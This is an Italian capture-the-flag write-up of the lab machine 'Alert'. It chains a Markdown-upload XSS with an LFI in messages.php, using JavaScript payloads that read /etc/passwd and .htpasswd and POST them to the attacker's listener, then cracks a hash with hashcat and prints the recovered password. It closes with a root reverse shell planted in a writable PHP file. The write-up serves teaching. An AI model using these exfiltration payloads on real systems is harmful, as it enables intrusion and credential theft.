+++
date = '2026-05-17T17:21:34+02:00'
draft = false
title = 'Alert Writeup IT'
+++
**Nome:** `joy.scd01`

**Data:** `24/01/2025`

![Alert.png](/images/imgs_alert/Alert.png)

---
# Introduzione

***Alert*** è una **macchina Linux di livello Easy** basata su una combinazione interessante di vulnerabilità semplici ma concatenate.

L’accesso iniziale si ottiene sfruttando una **XSS** concatenata ad una **LFI**, che permette di esfiltrare file dal server.

Per la Privilege Escalation ho invece sfruttato una misconfigurazione in un'**applicazione web locale**, che mi ha permesso di modificare un file scrivibile e ottenere una reverse shell come **root**.

---
# Tecniche Utilizzate

- **Concatenazione di Cross-site Scripting e Local File Inclusion**
- **Misconfigurazione nella Applicazione Web Locale**

---
# Enumerazione

## nmap

Scansione mirata con script e servizi:

```bash
nmap -sC -sV -T4 alert
```

![nmap.png](/images/imgs_alert/nmap.png)

**Porte aperte**:

**22**/tcp - SSH

**80**/tcp - HTTP Apache httpd 2.4.41 | **reindirizzamento a `http://alert.htb`**

Ho quindi aggiunto `alert.htb` al mio file `/etc/hosts`, eseguito una **scansione delle directory** con **gobuster** e una scansione dei virtual host con **ffuf**.

---
## gobuster

```bash
gobuster dir -u alert.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50
```

![gobuster_dir.png](/images/imgs_alert/gobuster_dir.png)

## ffuf

```bash
ffuf -u http://alert.htb -H 'HOST: FUZZ.alert.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -ac
```

![ffuf_vhost.png](/images/imgs_alert/ffuf_vhost.png)

Ho trovato "**statistics**" che ho aggiunto al mio file `/etc/hosts`.

---
## Web App

Ho analizzato **`statistics.alert.htb`** sul quale era hostato un login form.

Su `alert.htb` invece è hostata un'app che permette di caricare un file **Markdown** e visualizzarlo renderizzato in **HTML**, ho quindi inserito questo semplice payload in `test.md` per testare una possibile **XSS**:

```bash
<script>alert('XSS Test');</script>
```

![test.md.png](/images/imgs_alert/test.md.png)

Vulnerabile.

Ho anche analizzato la pagina dei contatti, dove è possibile inserire un'e-mail casuale e un messaggio per l'**amministratore**.

Ho testato se il parametro `message` innescasse un'interazione inserendo il mio IP:

```text
Message : http://<ip>:<port>/
```

Ho avviato un listener **socat** e ho ricevuto una connession:

```bash
socat TCP-LISTEN:22667,reuseaddr,fork -
```

![socat.png](/images/imgs_alert/socat.png)

Ho quindi provato a combinare la **XSS** nella pagina di upload e la **LFI** nel file `message.php` per ottenere l'accesso iniziale sulla macchina.

---
# Accesso Iniziale - Concatenazione di XSS e LFI

Dato che il bot amministratore avrebbe renderizzato il Markdown, avevo bisogno di un modo per innescare la lettura di un file locale e reindirizzarmi i dati. 

Ho quindi creato un payload JavaScript utilizzando in cui la prima richiesta sfrutta l'LFI per leggere i file, mentre la seconda invia il contenuto recuperato al mio listener socat tramite una richiesta POST.

```bash
<script>fetch("http://alert.htb/messages.php?file=../../../../etc/passwd").then(response => response.text()).then(data => {fetch("http://<ip>:<port>/", {method: "POST", body: data})});</script>
```

L'ho caricato e, quando ho cliccato su **View Markdown**, è stato creato un **URL** che ho copiato e incollato nel parametro messaggio della pagina dei contatti.

Quando l'ho inviato, ho effettivamente ricevuto in risposta sul mio **socat listener** il contenuto del file `/etc/passwd`:

![etcpasswd.png](/images/imgs_alert/etcpasswd.png)

Sono presenti 2 utenti :
"**albert**" e "**david**".

A quel punto non avevo un’idea immediata su come proseguire, quindi ho fatto quello che faccio sempre in questi casi: **mi sono riletto con calma tutta la fase di enumerazione**. 

Ho capito che il server era _Apache/2.4.41 Ubuntu_ (**Output della scansione nmap dei servizi**) e mi sono ricordato della presenza del file `.htpasswd` (**Output della scansione delle directory di Gobuster**).

Ho quindi deciso di modificare il mio payload per leggere il contenuto di quel file:

```bash
<script>fetch("http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd").then(response => response.text()).then(data => {fetch("http://<ip>:<port>/", {method: "POST", body: data})});</script>
```

Qui era presente la password hashata per "**albert**" :

![htpasswd.png](/images/imgs_alert/htpasswd.png)

**Nota**: _La scelta di leggere il file `.htpasswd` non è stata casuale, ma è stata guidata dall'esperienza. In passato, mi era già capitato di trovare informazioni sensibili all'interno di quello specifico file, il che **sottolinea ancora una volta l'importanza di analizzare attentamente i dati raccolti durante la fase di enumerazione iniziale**._

Ho usato **hashcat** per craccarla:

```bash
hashcat -m 1600 -a 0 alb_hash /usr/share/wordlists/rockyou.txt
```

![password_alb.png](/images/imgs_alert/password_alb.png)

Con le credenziali (**albert:manchesterunited**) ho ottenuto un foothold in questo box loggandomi con **SSH**.

Nella `/home` di **albert**, ho trovato la **user flag**.

![user.png](/images/imgs_alert/user.png)

---
# Privilege Escalation |  Misconfigurazione nella Applicazione Web Locale → root

Per elevare i miei privilegi, ho iniziato ad enumerare la macchina con comandi di base:

```bash
albert@alert:~$ ss -lntp
```

![lntp.png](/images/imgs_alert/lntp.png)

**La porta 8080 è in ascolto sul localhost**.

Ho creato un **tunnel SSH** per vedere di cosa si trattasse:

```bash
ssh -L 22667:localhost:8080 albert@alert
```

Ora potevo vedere la web app su `http://localhost:22667`. È una pagina di "**website-monitor**".

Non trovando nulla di utile nell’interfaccia,ho controllato sul server se ci fossero informazioni su questa web app e sul suo funzionamento. Qui ho trovato la directory contenente il file `configuration.php`:

![php.png](/images/imgs_alert/php.png)

L'utente **albert** aveva i permessi di scrittura su questo file. A quel punto è stato abbastanza naturale inserire una reverse shell in PHP (la classica che si trova ovunque).

Dopo essermi messo in ascolto con **netcat**, ho salvato e — boom, reverse shell come **root**.


![root.png](/images/imgs_alert/root.png)

---
# Conclusioni Finali

Questa macchina è un ottimo esempio di come vulnerabilità semplici, se combinate tra loro, possano portare rapidamente alla compromissione completa di un sistema.
La parte più interessante è la concatenazione della **Cross-site Scripting** con la **Local File Inclusion**, molto realistica in applicazioni dove l’input passa da più contesti senza controlli adeguati.

La Privilege Escalation invece è un chiaro esempio di quanto sia pericoloso lasciare file PHP modificabili da utenti non privilegiati.
Inoltre, il **tunnel SSH** è stato fondamentale per analizzare con calma la webapp locale e trovare il punto giusto da cui ottenere l’accesso a root.
